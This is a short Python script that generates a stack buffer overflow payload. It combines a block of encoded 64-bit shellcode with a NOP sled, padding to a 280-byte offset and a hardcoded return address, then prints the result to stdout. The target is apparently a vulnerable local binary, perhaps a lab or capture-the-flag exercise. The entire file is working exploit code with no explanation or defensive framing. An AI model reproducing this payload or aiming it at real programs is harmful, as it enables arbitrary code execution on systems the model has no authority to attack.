#!/usr/bin/python

import sys
import socket

shellcode = "\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05\xef" + "\xff\xff\xff\x48\xbb\xd2\x44\xe6\x0a\xfb\xc8\x96\x10\x48" + "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb8\x6d\xbe" + "\x93\x91\xca\xc9\x7a\xd3\x1a\xe9\x0f\xb3\x5f\xc4\xd7\xd6" + "\x60\xe4\x0a\xea\x94\xde\x99\x34\x2e\xf6\x50\x91\xf9\xce" + "\x1f\xd7\x2e\xd4\x52\xf4\xcd\xde\x21\x24\x2e\xcd\x52\xf4" + "\xcd\xde\x87\xb8\x47\xb8\x42\x04\x06\xfc\x31\x8a\x4b\xe3" + "\x7f\x0d\xa2\xad\x48\x4b\x0c\x5d\x25\x99\xa1\xf8\x3f\xa1" + "\x2c\xe6\x59\xb3\x41\x71\x42\x85\x0c\x6f\xec\xf4\xcd\x96" + "\x10"


buf_size = 256 
offset = 280 

# for real
ret_addr = "\x7f\xff\xff\xff\xdf\xf8"[::-1]

# 64 bytes
exploit = "\x90" * (buf_size - len(shellcode))
exploit += shellcode

# fill a bit
exploit += "A" * (offset - len(exploit))

exploit += ret_addr

sys.stdout.write(exploit)